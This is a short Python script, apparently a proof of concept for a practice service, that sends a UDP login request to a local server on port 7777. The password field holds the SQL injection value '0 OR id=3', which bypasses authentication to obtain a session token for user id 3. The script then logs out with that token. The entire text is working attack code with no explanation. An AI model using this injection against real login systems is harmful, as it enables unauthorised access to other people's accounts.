import socket
from ast import literal_eval

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.bind(('', 0))

request = {
    'source_port': sock.getsockname()[1],
    'action': 'login',
    'login': '0',
    'password': '0 OR id=3'
}
sock.sendto(bytearray(str(request), 'utf-8'), ('', 7777))
response = literal_eval(str(sock.recv(2048), 'utf-8'))
print(response)

request = {
    'action': 'logout',
    'token': response['token']
}
sock.sendto(bytearray(str(request), 'utf-8'), ('', 7777))
